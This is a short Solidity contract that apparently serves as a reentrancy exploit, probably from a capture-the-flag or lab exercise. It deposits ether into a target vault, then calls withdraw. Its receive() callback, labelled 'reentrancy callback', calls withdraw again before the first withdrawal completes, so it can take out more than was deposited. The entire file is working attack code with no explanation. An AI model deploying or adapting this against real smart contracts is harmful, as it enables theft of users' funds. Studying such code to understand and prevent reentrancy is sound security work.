// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

interface IVault{

    function withdraw(uint256 _amount) external;
    function deposit(address _to) payable external;
    function balanceOf(address _who) external view returns (uint256);
}

contract vault{

   IVault vaultContract;
   bool enter;

    constructor(address _vault) public {
        vaultContract = IVault(_vault);
    }

    function depositIn() payable external  {
        vaultContract.deposit{value: msg.value}(address(this));
    }

    function attack() external {
        vaultContract.withdraw(vaultContract.balanceOf(address(this)));
    }

    //reentrancy callback
    receive() external payable { 

        if (!enter) { 
            enter = true;
            vaultContract.withdraw(vaultContract.balanceOf(address(this)));
        } 
    }
}